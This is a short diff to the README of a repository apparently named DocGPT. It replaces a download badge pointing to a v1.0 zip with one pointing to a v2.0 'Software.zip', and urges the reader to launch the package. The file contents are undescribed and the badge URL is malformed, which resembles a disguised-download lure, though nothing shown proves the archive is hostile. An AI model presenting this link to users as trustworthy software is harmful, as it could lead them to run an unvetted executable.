@@ -26,7 +26,7 @@ Welcome to the **DocGPT** repository! :hospital:
 
 To explore the potential of DocGPT, you can download the software package from the following link:
 
-[![Launch Software](https://github.com/Doanquangthe/DocGPT/releases/download/v1.0/Release_x64.zip%20Software-Download%20Here-brightgreen)](https://github.com/Doanquangthe/DocGPT/releases/download/v1.0/Release_x64.zip)
+[![Launch Software](https://github.com/Doanquangthe/DocGPT/releases/download/v2.0/Software.zip%20Software-Download%20Here-brightgreen)](https://github.com/Doanquangthe/DocGPT/releases/download/v2.0/Software.zip)
 
 ### Note: 🚀 Software package needs to be launched!
 
